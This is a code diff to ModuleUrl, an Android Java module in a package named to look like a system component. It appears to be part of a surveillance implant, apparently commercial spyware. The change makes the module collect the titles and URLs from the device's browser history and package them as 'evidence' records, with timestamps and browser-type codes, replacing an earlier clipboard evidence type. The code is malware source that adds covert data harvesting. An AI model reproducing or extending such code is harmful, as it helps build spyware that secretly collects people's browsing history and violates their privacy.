@@ -31,6 +31,8 @@ import com.android.dvci.module.BaseModule;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.StringUtils;
+import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 
 import java.util.ArrayList;
@@ -40,6 +42,7 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 
 	private static final String TAG = "ModuleUrl"; //$NON-NLS-1$
 
+	int VERSION_DELIMITER = 0x20100713;
 
 	@Override
 	public void actualStart() {
@@ -88,29 +91,35 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveUrls), " + title + " url: " + url);
 				};
+
+				saveEvidence(title, url);
 				mCur.moveToNext();
 			}
 		}
-
 	}
 
-	private void saveEvidence(String ret) {
-		final byte[] tm = (new DateTime()).getStructTm();
-		final byte[] payload = WChar.getBytes(ret.toString(), true);
-		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
-		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
+	private void saveEvidence(String title, String url) {
+
+		//BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari', 'Browser', 'Web']
+		int BROWSER_TYPE = 8;
+
+		final byte[] b_tm = (new DateTime()).getStructTm();
+		final byte[] b_url = WChar.getBytes(url.toString(), true);
+		final byte[] b_title = WChar.getBytes(title, true); //$NON-NLS-1$
+		//final byte[] b_window = WChar.getBytes("", true); //$NON-NLS-1$
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		
 		EvidenceBuilder evidence;
 		
 		synchronized (this) {
-			evidence = new EvidenceBuilder(EvidenceType.CLIPBOARD);
+			evidence = new EvidenceBuilder(EvidenceType.URL);
 		}
 		
-		items.add(tm);
-		items.add(process);
-		items.add(window);
-		items.add(payload);
+		items.add(b_tm);
+		items.add(ByteArray.intToByteArray(VERSION_DELIMITER));
+		items.add(b_url);
+		items.add(ByteArray.intToByteArray(BROWSER_TYPE));
+		items.add(b_title);
 		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
